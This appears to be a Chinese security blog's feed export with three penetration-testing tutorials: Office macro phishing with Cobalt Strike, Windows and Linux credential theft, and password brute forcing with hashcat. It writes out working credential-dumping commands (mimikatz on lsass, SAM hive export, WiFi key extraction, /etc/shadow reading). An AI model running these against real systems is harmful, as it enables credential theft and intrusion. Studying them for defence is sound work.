        <content type="html"><![CDATA[<h1 id="什么是Office宏？"><a href="#什么是Office宏？" class="headerlink" title="什么是Office宏？"></a>什么是Office宏？</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720150905948.png" alt="image-20210720150905948"></p><p>宏是一种特殊用途的程序，用于在较大的应用程序或软件中实现过程自动化。宏通常由一系列命令和操作组成，这些命令和操作是用专用的宏语言或标准编程语言编写的。当某个触发器发生时，应用程序将自动执行这些命令。</p><p>宏在 Office 套件中得到广泛实现，以实现常见任务和过程的自动化。不同的套件使用不同的宏语言，但值得注意的是 Visual Basic for Applications (MS Office)、 LibreOffice Basic (LibreOffice)和 OpenOffice Basic (OpenOffice Basic)。</p><p>大多数 Office 宏语言具有相当广泛的特性，可以访问各种资源。例如，MS Office 宏(用 VBA 编写)可以运行可执行文件并使用网络功能。</p><h1 id="为什么这是一个问题？"><a href="#为什么这是一个问题？" class="headerlink" title="为什么这是一个问题？"></a>为什么这是一个问题？</h1><p>正如任何允许在后台执行可定制脚本的程序一样，攻击者可以利用 Office 套件运行恶意代码并危害受害者。通常宏恶意软件在感染链中扮演加载程序的角色，在终止之前会下载并执行另一个有效载荷。这个恶意软件会被植入到——你猜对了——一个 Office 文件中，然后被植入到某个地方，让受害者可以访问它，比如说一个共享文件或者通过电子邮件。一旦文件被打开，恶意软件将被执行。这被称为鱼叉式钓鱼攻击 ，它已经流行了很长一段时间。</p><p>宏恶意软件的一个令人难忘的例子是 Melissa 病毒，它最早出现在1999年。这个恶意软件嵌入在一个微软 Word 文件中，一旦打开，就会自动发送电子邮件给受害者通讯录中的前50个联系人。虽然它没有对个人用户造成多大伤害(除了意外地给 DDOS 造成了几个邮件服务) ，但造成的损失总值估计为8000万美元，攻击者被判处在联邦监狱服刑20个月。</p><p>鱼叉式网络钓鱼方法也被各种团体用于复杂的 APT 攻击，包括一些被认为与间谍机构有联系的团体。在一些更复杂的攻击中，合法的办公文件被恶意的、看起来完全相同的文件替代。那么，为什么世界各地的黑客，包括高级黑客组织，会选择使用一种自90年代以来没有太大变化的攻击机制呢？</p><h1 id="用户执行"><a href="#用户执行" class="headerlink" title="用户执行"></a>用户执行</h1><p>在当今不断发展的国防环境中，鱼叉式网络钓鱼攻击依赖于一个独特的漏洞，这个漏洞很难完全缓解人为错误。攻击者等待受害者采取某些行动(比如，打开一个文件)来获得执行，而不是依赖于受害者机器的漏洞。</p><p>此外，MS Office 宏执行通常是默认启用的，或者在打开恶意文件时单击鼠标即可执行。这为用户的错误创造了很大的余地，并增加了攻击成功的可能性。</p><p>依靠用户执行还允许攻击者专门针对非技术用户进行攻击和引诱，从而损害整个企业的利益。但是，正如我们将在下面看到的，通过实现适当的端点防御机制和教育用户，缓解仍然是可能的。</p><p>以下是微软威胁情报中心在2016年夏天收集的一个常见的微软 Office 宏诱饵的例子:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/word-image-427.png"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>这里用Cobalt Strike生成恶意的宏代码，并以此创建一个恶意的word文件。当受害者有意或无意打开此文件且启用宏，攻击者就可以通过提前设置好的监听器连接到受害者的机器，从而进一步地利用。</p><p>前提：因不能免杀，遇到杀毒软件直接gg，故测试过程中关闭了所有杀毒软件。（火绒yyds!）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720162518210.png" alt="image-20210720162518210"></p><h2 id="1-创建监听器"><a href="#1-创建监听器" class="headerlink" title="1.创建监听器"></a>1.创建监听器</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720153514707.png" alt="image-20210720153514707"></p><h2 id="2-生成宏代码"><a href="#2-生成宏代码" class="headerlink" title="2.生成宏代码"></a>2.生成宏代码</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154150695.png" alt="image-20210720154150695"></p><h2 id="3-新建word文档"><a href="#3-新建word文档" class="headerlink" title="3.新建word文档"></a>3.新建word文档</h2><p>选择视图–&gt;宏–&gt;设置宏名–&gt;创建</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154704861.png" alt="image-20210720154704861"></p><p>删除原有内容，把前面复制的宏代码粘贴进去，然后保存。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720154946944.png" alt="image-20210720154946944"></p><p>回退到office页面，注意：“保存类型”选择“启用宏的Word文档(*.docm)”</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720155243514.png" alt="image-20210720155243514"></p><h2 id="4-快乐上线"><a href="#4-快乐上线" class="headerlink" title="4.快乐上线"></a>4.快乐上线</h2><p>当目标点击此word文档且启用宏后，就可以快乐上线CS了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720160739658.png" alt="image-20210720160739658"></p><p>通过CS后续利用~</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210720160021211.png" alt="image-20210720160021211"></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><h2 id="监督宏执行"><a href="#监督宏执行" class="headerlink" title="监督宏执行"></a>监督宏执行</h2><p>鱼叉式钓鱼的尝试依赖于用户执行和人为错误来实现。因此，降低风险的最有效策略之一就是在整个组织中限制使用宏。</p><p>如果一个组织不使用宏，它们也可能被完全禁用。但事实并非总是如此。当宏必须使用时，应该设置策略以尽量减少受到攻击的可能性(在 Windows 上，这可以通过组策略编辑器完成)。这可以通过两种互补的形式来实现:</p><ul><li><strong>App Policy 应用程序政策</strong> 。宏应该只在它们实际使用的应用程序中启用——不管是 Excel、 Word、 PowerPoint 等。此外，组织可以选择只从受信任位置启用宏、经过数字签名的宏等</li><li><strong>User Policy 用户政策</strong> 。在企业环境中，应该只为实际使用该功能的用户启用宏</li></ul><h2 id="减少攻击面"><a href="#减少攻击面" class="headerlink" title="减少攻击面"></a>减少攻击面</h2><p>攻击面是敌方可能危害设备或网络的方式或地点的总数。在宏恶意软件的背景下，可以修改 VBA 宏访问的功能、资源和 COM 对象，以减少攻击面。</p><p>通过限制对恶意软件运行所必需的资源的访问，积极地减少端点的攻击面。在这些规则和限制中，下面是一些专门针对 Office 宏攻击的规则和限制:</p><ul><li>阻止 Office 应用程序创建可执行代码</li><li>阻止来自 Office 宏的 Win32调用</li><li>阻止Office 应用程序创建子进程</li><li>阻止 Office 应用程序向其他进程注入代码</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://www.cynet.com/attack-techniques-hands-on/office-macro-attacks/">https://www.cynet.com/attack-techniques-hands-on/office-macro-attacks/</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44288604/article/details/111059633">https://blog.csdn.net/weixin_44288604/article/details/111059633</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透初探 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凭证窃取的几种方式</title>
      <link href="posts/51894.html"/>
      <url>posts/51894.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-Windows登录凭证窃取"><a href="#0x01-Windows登录凭证窃取" class="headerlink" title="0x01 Windows登录凭证窃取"></a>0x01 Windows登录凭证窃取</h1><blockquote><p>Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。它们都是用户密码经过hash加密后的形式。</p><p>Windows系统下hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">Administrator:500:AF01DF70036EBACFAAD3B435B51404EE:44F077E27F6FEF69E7BD834C7242B040</span><br><span class="line"></span><br><span class="line">用户名称为：Administrator</span><br><span class="line">RID为：500</span><br><span class="line">LM-HASH值为：AF01DF70036EBACFAAD3B435B51404EE</span><br><span class="line">NTLM-HASH值为：44F077E27F6FEF69E7BD834C7242B040</span><br></pre></td></tr></table></figure><h2 id="1-从LSASS内存中读取"><a href="#1-从LSASS内存中读取" class="headerlink" title="1.从LSASS内存中读取"></a>1.从LSASS内存中读取</h2><p>lsass.exe是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</p><p>要想读取内存的密码，前提是用户登陆过机器，登陆过就会在内存中停留：lsass.exe，一般在进程管理器中能看到，如下图（测试机器：windows server 2008）：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718221756433.png" alt="image-20210718221756433"></p><p>第一步，导出lsass.exe进程中的内容，使用工具：procdump（注：必须使用管理员权限），会在当前目录下产生一个 lsass.dmp 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718215950623.png" alt="image-20210718215950623"></p><p>第二步，通过mimikatz读取（08或者08以下的机器读取的直接是明文密码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718222025579.png" alt="image-20210718222025579"></p><p>PS：直接使用mimikatz读取也可以（当mimikatz无法在目标机器上运行时则用上面的方法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="2-从注册表中读取密码"><a href="#2-从注册表中读取密码" class="headerlink" title="2.从注册表中读取密码"></a>2.从注册表中读取密码</h2><p>注册表读取密码主要获取的是两个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM Sys.hiv</span><br><span class="line">reg save HKLM\SAM Sam.hiv</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718223708527.png" alt="image-20210718223708527"></p><p>导出注册表之后，我们可以通过mimikatz读取管理员密码的hash值（如下图中的Hash NTLM）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv &quot; exit&gt; hiv.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718223905271.png" alt="image-20210718223905271"></p><h2 id="3-抓取浏览器保存密码"><a href="#3-抓取浏览器保存密码" class="headerlink" title="3.抓取浏览器保存密码"></a>3.抓取浏览器保存密码</h2><p>很多浏览器都提供了记住密码的功能，用户在登录一些网站的时候会选择记住密码。</p><p>使用工具LaZagne，可以提取浏览器所保存的密码</p><p>github项目地址：<a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取所有密码：</span><br><span class="line">lazagne.exe all</span><br></pre></td></tr></table></figure><h2 id="4-查看电脑wifi密码"><a href="#4-查看电脑wifi密码" class="headerlink" title="4.查看电脑wifi密码"></a>4.查看电脑wifi密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看电脑连接过的所有wifi</span><br><span class="line">netsh wlan show profiles</span><br><span class="line"># 查看某一wifi的密码</span><br><span class="line">netsh wlan show profiles name&#x3D;&quot;xxx&quot; key&#x3D;clear</span><br><span class="line"># CMD一键获取 所有连接过的WIFI密码</span><br><span class="line">for &#x2F;f &quot;skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key&#x3D;clear</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718230750294.png" alt="image-20210718230750294"></p><h1 id="0x02-Linux登录凭证窃取"><a href="#0x02-Linux登录凭证窃取" class="headerlink" title="0x02 Linux登录凭证窃取"></a>0x02 Linux登录凭证窃取</h1><h2 id="1-history记录敏感操作"><a href="#1-history记录敏感操作" class="headerlink" title="1.history记录敏感操作"></a>1.history记录敏感操作</h2><p>Linux系统会自动把用户的操作命令记录到历史列表中，当用户在命令行中输入账号、密码进行登录时，将会导致敏感信息泄露。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210718233918936.png" alt="image-20210718233918936"></p><h2 id="2-shadow文件破解"><a href="#2-shadow文件破解" class="headerlink" title="2.shadow文件破解"></a>2.shadow文件破解</h2><p><code>/etc/shadow</code>中保存着用户的相关密码信息，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># tail -n 1 &#x2F;etc&#x2F;shadow</span><br><span class="line">test:$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e&#x2F;:18825:0:99999:7:::</span><br></pre></td></tr></table></figure><p>test用户的密码密文即为<code>$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e/</code></p><p>可以通过John或hashcat等工具进行暴力破解获得明文。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717160033067.png" alt="image-20210717160033067"></p><h2 id="3-全局搜索敏感信息"><a href="#3-全局搜索敏感信息" class="headerlink" title="3.全局搜索敏感信息"></a>3.全局搜索敏感信息</h2><p>全局搜索配置文件、脚本、数据库、日志文件是否有包含密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;password&#x3D;&quot; &#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-mimipenguin抓取密码"><a href="#4-mimipenguin抓取密码" class="headerlink" title="4.mimipenguin抓取密码"></a>4.mimipenguin抓取密码</h2><p>一款Linux下的密码抓取神器，需要root权限运行，通过转储进程并提取很可能包含明文密码的行来利用内存中的明文凭证，目前支持Kali、Ubnutu等操作系统。</p><p>github地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;huntergregal&#x2F;mimipenguin</span><br></pre></td></tr></table></figure><h2 id="5-Impost3r"><a href="#5-Impost3r" class="headerlink" title="5.Impost3r"></a>5.Impost3r</h2><p>一个利用C语言编写,用来窃取linux下各类密码(ssh,su,sudo)的工具。</p><p>github项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ph4ntonn&#x2F;Impost3r</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://cloud.tencent.com/developer/article/1752147">内网渗透之各种密码凭证窃取 - 渗透红队笔记</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/vp-ggvm4MUqKkBwr32FEXA">Linux下登录凭证窃取技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透初探 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈暴力破解</title>
      <link href="posts/25316.html"/>
      <url>posts/25316.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>​    暴力破解(brute force)，又名暴力攻击、暴力猜解，从数学和逻辑学的角度，它属于穷举法在现实场景的运用。当密码未知或获得密码哈希时，攻击者会使用暴力破解来试图登录帐户，即通过利用大量猜测和穷举的方式来尝试获取用户口令的攻击方式。在ATT&amp;CK中暴力破解有如下四种子技术。</p><ol><li><p>Password Guessing（密码猜测）</p><p>事先不了解系统和环境，攻击者会猜测密码以尝试登录帐户。在不了解帐户密码的情况下，攻击者可能会在操作过程中通过使用常用密码字典来猜测登录密码，而无须事先了解系统或环境密码。</p></li><li><p>Password Cracking（密码破解）</p><p>当获得凭证材料（例如密码哈希）时，攻击者可能会解密密码来尝试恢复可用的凭据，例如纯文本密码。</p></li><li><p>Password Spraying（密码喷洒）</p><p>使用多个密码来暴力破解一个账号可能会导致该账号被锁定，攻击者可能会针对许多不同帐户使用单个或少量的常用密码列表，以尝试获取有效帐户凭据。</p><p>密码喷洒常常针对如下服务：</p><ul><li><p>SSH (22/TCP)</p></li><li><p>Telnet (23/TCP)</p></li><li><p>FTP (21/TCP)</p></li><li><p>NetBIOS/SMB /Samba (139/TCP &amp; 445/TCP)</p></li><li><p>LDAP (389/TCP)</p></li><li><p>Kerberos (88/TCP)</p></li><li><p>RDP/终端服务 (3389/TCP)</p></li><li><p>HTTP/HTTP管理服务 (80/TCP &amp; 443/TCP)</p></li><li><p>MSSQL (1433/TCP)</p></li><li><p>Oracle (1521/TCP)</p></li><li><p>MySQL (3306/TCP)</p></li><li><p>VNC (5900/TCP)</p></li></ul></li><li><p>Credential Stuffing（撞库）</p><p>攻击者可以使用受害者历史上泄露的数据获得凭据，通过凭据重叠来访问目标帐户。</p></li></ol><h1 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h1><h2 id="1-密码猜测"><a href="#1-密码猜测" class="headerlink" title="1.密码猜测"></a>1.密码猜测</h2><p><code>Login.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>随便登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;checkLogin.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">        Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>checkLogin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&quot;root&quot;</span> &amp;&amp; <span class="variable">$password</span>==<span class="string">&#x27;root&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上代码为一个简单的表单提交到后台，判断账号，密码都为root则登陆成功。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715143940035.png" alt="image-20210715143940035"></p><p>接下来burpsuite抓包使用Intruder模块进行爆破，通过对比数据包的长度可以很好的判断是否爆破成功，因为爆破成功和失败的长度是不一样的。</p><p>在数据包中选定欲爆破的参数</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715144802467.png" alt="image-20210715144802467"></p><p>设置爆破的字典</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715144857628.png" alt="image-20210715144857628"></p><p>根据响应的数据包的长度可以判断出正确的账号、密码。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715145116699.png" alt="image-20210715145116699"></p><p>PS：进阶技巧</p><p>（1）<strong>默认凭证</strong></p><p>在对某一服务进行暴力破解之前，我们首先应该尝试该服务的默认口令，这样也许可以节约大量的时间和工作量。通过搜索引擎等方式可以获取到不同服务的默认口令，以下是一些默认口令的合集。</p><ul><li><a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm%E2%80%98">http://www.vulnerabilityassessment.co.uk/passwordsC.htm‘</a></li><li><a href="https://192-168-1-1ip.mobi/default-router-passwords-list/">https://192-168-1-1ip.mobi/default-router-passwords-list/</a></li><li><a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li><li><a href="https://bizuns.com/default-passwords-list">https://bizuns.com/default-passwords-list</a></li><li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv</a></li><li><a href="https://www.cirt.net/passwords">https://www.cirt.net/passwords</a></li><li><a href="https://www.passwordsdatabase.com/">https://www.passwordsdatabase.com/</a></li></ul><p>通过对这些默认口令的分析不难发现，很多都是以<code>admin</code>、<code>root</code>、<code>administrator</code>、<code>password</code>等字样出现，而如果不更改掉默认口令，攻击者往往就能以此轻松突破。</p><p>（2）<strong>好用的字典</strong></p><p>爆破的字典选什么是一个技巧，并非越全越好，这里整理了一些好用的字典仓库（感谢众大佬的分享），仅供参考。</p><ul><li><a href="https://github.com/Dormidera/WordList-Compendium">https://github.com/Dormidera/WordList-Compendium</a></li><li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li><li><a href="https://github.com/3had0w/Fuzzing-Dicts">https://github.com/3had0w/Fuzzing-Dicts</a></li></ul><p>（3）<strong>自定义字典</strong></p><p>如果前期已经通过社工等方式搜集到目标有关信息，也许根据目标生成的专属字典能增加破解效率。</p><p>使用到的工具：<a href="https://github.com/LandGrey/pydictor">pydictor</a>—— 一个强大实用的黑客暴力破解字典建立工具</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717140826872.png" alt="image-20210717140826872"></p><p>详细使用方法可以参考其<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">用法示例</a></p><h2 id="2-密码破解"><a href="#2-密码破解" class="headerlink" title="2.密码破解"></a>2.密码破解</h2><p>在通过一定方式获得密码哈希后，进一步要做的就是将其破解了。</p><blockquote><p>何为hash？Hash 一般翻译为“散列”，也可直接音译为“哈希”的。这个加密函数对一个任意长度的字符串数据进行一次加密函数运算，然后返回一个固定长度的字符串。Hash 主要用于信息安全领域中加密算法，渗透测试中获取目标系统的明文或 Hash 往往是整个渗透测试过程中重要的一环。</p></blockquote><h3 id="Window-Hash"><a href="#Window-Hash" class="headerlink" title="Window Hash"></a>Window Hash</h3><p>在 Windows 系统中本机用户的密码 Hash 是放在本地的 SAM(Security Account Manager) 文件里面，域内用户的密码 Hash是存在域控的 NTDS.DIT 文件里面。</p><p>分类</p><ol><li><p>LM</p><p>LAN Manager（LM）哈希是 Windows 系统所用的第一种密码哈希算法，是一种较古老的 Hash，在 LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据。它只有唯一一个版本且一直用到了 NT LAN Manager（NTLM）哈希的出现，在 Windows Vista/Windows 7/Windows Server 2008 以及后面的系统中，LM哈希算法是默认关闭的，LM 算法是在 DES 基础上实现的，不区分字母大小写。</p></li><li><p>NTLM</p><p>NT LAN Manager（NTLM）哈希是Windows系统认可的另一种算法，用于替代古老的 LM-Hash，一般指 Windows 系统下 Security Account Manager（SAM）中保存的用户密码 Hash，在 Windows Vista/Windows 7/Windows Server 2008 以及后面的系统中，NTLM 哈希算法是默认启用的。</p></li></ol><p>获取</p><p>Hash的获取可以使用mimikatz工具</p><p>项目地址：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>下图为使用mimikatz获取win10用户的密码Hash</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717142402993.png" alt="image-20210717142402993"></p><p><strong>Hashcat 破解</strong></p><p>在拿到 LM 或者 NTLM 的密文时，如果没有明文的时候，最直接的方法当然是直接将其解密啦，这里使用Hashcat来进行密码解密。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715154154916.png" alt="image-20210715154154916"></p><p>如上图我们通过msf获取到目标主机的hash</p><blockquote><p>LM：44efce164ab921caaad3b435b51404ee</p><p>NTLM：32ed87bdb5fdc5e9cba88547376818d4</p><p>SHA1：6ed5833cf35286ebf8662b7b5949f0d742bbec3f</p></blockquote><p>实际明文为：123456</p><p>Hashcat破解过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 1000 --force 32ed87bdb5fdc5e9cba88547376818d4 password.txt</span><br></pre></td></tr></table></figure><p><code>-a 0</code> 字典破解</p><p>hashcat –-help 可以看到 LM 和 NTLM 对应的 hash 编号分别为<code>3000</code>和<code>1000</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715160322263.png" alt="image-20210715160322263"></p><p><strong>在线Hash破解</strong></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715160549150.png" alt="image-20210715160549150"></p><p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210716100314103.png" alt="image-20210716100314103"></p><h3 id="Linux-Hash"><a href="#Linux-Hash" class="headerlink" title="Linux Hash"></a>Linux Hash</h3><p>建立一个test用户进行测试，密码test</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -m test</span><br><span class="line">passwd test</span><br></pre></td></tr></table></figure><p>Linux 密码信息保存在两个文件中，分别为： <code>/etc/passwd</code> 和 <code>/etc/shadow</code></p><p><strong>/etc/passwd</strong></p><p>普通用户权限能够查看</p><p>保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分</p><ol><li>用户名</li><li>密码，x 表示密码保存在 <code>/etc/shadow</code></li><li>UID，0 代表 root</li><li>GID，表示所在组</li><li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li><li>用户主目录</li><li>默认 shell 类型</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 